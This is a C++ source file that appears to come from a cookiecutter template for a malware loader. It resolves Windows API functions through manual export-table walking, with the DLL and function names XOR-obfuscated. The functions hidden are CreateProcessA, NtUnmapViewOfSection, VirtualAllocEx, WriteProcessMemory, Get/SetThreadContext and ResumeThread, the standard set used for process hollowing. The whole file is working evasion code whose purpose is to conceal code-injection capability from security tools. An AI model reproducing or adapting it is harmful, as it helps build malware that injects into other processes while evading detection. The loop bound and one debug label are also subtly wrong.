#include "hiddenImports.h"


PVOID WINAPI GetFunctionAddress(LPCTSTR lpDllName, LPCSTR lpFunctionName) {
    PPE_HEADERS ppehModuleHeaders;
    HMODULE hModule;
    PDWORD pdwAddress, pdwName;
    PWORD pwOrdinal;

    hModule = GetModuleHandle(lpDllName);

    if (!hModule)
        hModule = LoadLibrary(lpDllName);
    if(!hModule)
        return nullptr;

    ppehModuleHeaders = LoadPEHeaders((VIRTUAL_ADDRESS)hModule);
    if(ppehModuleHeaders->NTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == 0)
        return nullptr;

    auto pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)hModule + ppehModuleHeaders->NTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    pdwAddress = (PDWORD)((LPBYTE)hModule + pExportDirectory->AddressOfFunctions);
    pdwName = (PDWORD)((LPBYTE)hModule + pExportDirectory->AddressOfNames);

    pwOrdinal = (PWORD)((LPBYTE)hModule + pExportDirectory->AddressOfNameOrdinals);

    for(int i=0; i < pExportDirectory->AddressOfFunctions; i++) {
        if(!strcmp(lpFunctionName, (char*)hModule + pdwName[i])) {
            return (PVOID)((LPBYTE)hModule + pdwAddress[pwOrdinal[i]]);
        }
    }
    return nullptr;
}

PVOID WINAPI GetKernel32Function(LPCSTR lpFunctionName) {
    char encryptedKernel32[] = "{{ cookiecutter.encrypted_kernel32 }}";
    Xor(encryptedKernel32, 12, IMPORTS_KEY, IMPORTS_KEY_LENGTH);
    return GetFunctionAddress((LPCSTR)encryptedKernel32, lpFunctionName);
}

PVOID WINAPI GetNtDllFunction(LPCSTR lpFunctionName) {
    char encryptedNtDll[] = "{{ cookiecutter.encrypted_ntdll }}";
    Xor(encryptedNtDll, 9, IMPORTS_KEY, IMPORTS_KEY_LENGTH);
    return GetFunctionAddress((LPCSTR)encryptedNtDll, lpFunctionName);
}

_CreateProcessA GetHiddenCreateProcessA() {
    DebugInfoMessage("Getting address of CreateProcessA");
    char encryptedCreateProcessA[] = "{{ cookiecutter.encrypted_create_process_a }}";
    Xor(encryptedCreateProcessA, 14, IMPORTS_KEY, IMPORTS_KEY_LENGTH);
    auto HiddenCreateProcessA = (_CreateProcessA)GetKernel32Function((LPCSTR)encryptedCreateProcessA);
    if (!HiddenCreateProcessA) {
        DebugErrorMessage("Failed to get address of CreateProcessA");
    } else {
        DebugData("Address of VirtualProtectEx", (VIRTUAL_ADDRESS) HiddenCreateProcessA, FORMAT_ADDRESS);
    }
    return HiddenCreateProcessA;
}

_NtUnmapViewOfSection GetHiddenNtUnmapViewOfSection() {
    DebugInfoMessage("Getting address of NtUnmapViewOfSection");
    char encryptedNtUnmapViewOfSection[] = "{{ cookiecutter.encrypted_nt_unmap_view_of_section }}";
    Xor(encryptedNtUnmapViewOfSection, 20, IMPORTS_KEY, IMPORTS_KEY_LENGTH);
    auto HiddenNtUnmapViewOfSection = (_NtUnmapViewOfSection) GetNtDllFunction((LPCSTR)encryptedNtUnmapViewOfSection);
    if (!HiddenNtUnmapViewOfSection) {
        DebugErrorMessage("Failed to get address of NtUnmapViewOfSection");
    } else {
        DebugData("Address of NtUnmapViewOfSection", (VIRTUAL_ADDRESS) HiddenNtUnmapViewOfSection, FORMAT_ADDRESS);
    }
    return HiddenNtUnmapViewOfSection;
}

_VirtualAllocEx GetHiddenVirtualAllocEx() {
    DebugInfoMessage("Getting address of VirtualAllocEx");
    char encryptedVirtualAllocEx[] = "{{ cookiecutter.encrypted_virtual_alloc_ex }}";
    Xor(encryptedVirtualAllocEx, 14, IMPORTS_KEY, IMPORTS_KEY_LENGTH);
    auto HiddenVirtualAllocEx = (_VirtualAllocEx)GetKernel32Function((LPCSTR)encryptedVirtualAllocEx);
    if (!HiddenVirtualAllocEx) {
        DebugErrorMessage("Failed to get address of VirtualAllocEx");
    } else {
        DebugData("Address of VirtualAllocEx", (VIRTUAL_ADDRESS) HiddenVirtualAllocEx, FORMAT_ADDRESS);
    }
    return HiddenVirtualAllocEx;
}

_WriteProcessMemory GetHiddenWriteProcessMemory() {
    DebugInfoMessage("Getting address of WriteProcessMemory");
    char encryptedWriteProcessMemory[] = "{{ cookiecutter.encrypted_write_process_memory }}";
    Xor(encryptedWriteProcessMemory, 18, IMPORTS_KEY, IMPORTS_KEY_LENGTH);
    auto HiddenWriteProcessMemory = (_WriteProcessMemory)GetKernel32Function((LPCSTR)encryptedWriteProcessMemory);
    if (!HiddenWriteProcessMemory) {
        DebugErrorMessage("Failed to get address of WriteProcessMemory");
    } else {
        DebugData("Address of WriteProcessMemory", (VIRTUAL_ADDRESS) HiddenWriteProcessMemory, FORMAT_ADDRESS);
    }
    return HiddenWriteProcessMemory;
}

_VirtualProtectEx GetHiddenVirtualProtectEx() {
    DebugInfoMessage("Getting address of VirtualProtectEx");
    char encryptedVirtualProtectEx[] = "{{ cookiecutter.encrypted_virtual_protect_ex }}";
    Xor(encryptedVirtualProtectEx, 16, IMPORTS_KEY, IMPORTS_KEY_LENGTH);
    auto HiddenVirtualProtectEx = (_VirtualProtectEx)GetKernel32Function((LPCSTR)encryptedVirtualProtectEx);
    if (!HiddenVirtualProtectEx) {
        DebugErrorMessage("Failed to get address of VirtualProtectEx");
    } else {
        DebugData("Address of VirtualProtectEx", (VIRTUAL_ADDRESS) HiddenVirtualProtectEx, FORMAT_ADDRESS);
    }
    return HiddenVirtualProtectEx;
}

_GetThreadContext GetHiddenGetThreadContext() {
    DebugInfoMessage("Getting address of GetThreadContext");
    char encryptedGetThreadContext[] = "{{ cookiecutter.encrypted_get_thread_context }}";
    Xor(encryptedGetThreadContext, 16, IMPORTS_KEY, IMPORTS_KEY_LENGTH);
    auto HiddenGetThreadContext = (_GetThreadContext)GetKernel32Function((LPCSTR)encryptedGetThreadContext);
    if (!HiddenGetThreadContext) {
        DebugErrorMessage("Failed to get address of GetThreadContext");
    } else {
        DebugData("Address of GetThreadContext", (VIRTUAL_ADDRESS) HiddenGetThreadContext, FORMAT_ADDRESS);
    }
    return HiddenGetThreadContext;
}

_SetThreadContext GetHiddenSetThreadContext() {
    DebugInfoMessage("Getting address of SetThreadContext");
    char encryptedSetThreadContext[] = "{{ cookiecutter.encrypted_set_thread_context }}";
    Xor(encryptedSetThreadContext, 16, IMPORTS_KEY, IMPORTS_KEY_LENGTH);
    auto HiddenSetThreadContext = (_SetThreadContext)GetKernel32Function((LPCSTR)encryptedSetThreadContext);
    if (!HiddenSetThreadContext) {
        DebugErrorMessage("Failed to get address of SetThreadContext");
    } else {
        DebugData("Address of SetThreadContext", (VIRTUAL_ADDRESS) HiddenSetThreadContext, FORMAT_ADDRESS);
    }
    return HiddenSetThreadContext;
}

_ResumeThread GetHiddenResumeThread() {
    DebugInfoMessage("Getting address of ResumeThread");
    char encryptedResumeThread[] = "{{ cookiecutter.encrypted_resume_thread }}";
    Xor(encryptedResumeThread, 12, IMPORTS_KEY, IMPORTS_KEY_LENGTH);
    auto HiddenResumeThread = (_ResumeThread)GetKernel32Function((LPCSTR)encryptedResumeThread);
    if (!HiddenResumeThread) {
        DebugErrorMessage("Failed to get address of ResumeThread");
    } else {
        DebugData("Address of ResumeThread", (VIRTUAL_ADDRESS) HiddenResumeThread, FORMAT_ADDRESS);
    }
    return HiddenResumeThread;
}

_ReadProcessMemory GetReadProcessMemory() {
    DebugInfoMessage("Getting address of ReadProcessMemory");
    char encryptedReadProcessMemory[] = "{{ cookiecutter.encrypted_read_process_memory }}";
    Xor(encryptedReadProcessMemory, 17, IMPORTS_KEY, IMPORTS_KEY_LENGTH);
    auto ReadProcessMemory = (_ReadProcessMemory)GetKernel32Function((LPCSTR)encryptedReadProcessMemory);
    if (!ReadProcessMemory) {
        DebugErrorMessage("Failed to get address of ReadProcessMemory");
    } else {
        DebugData("Address of ReadProcessMemory", (VIRTUAL_ADDRESS) ReadProcessMemory, FORMAT_ADDRESS);
    }
    return ReadProcessMemory;
}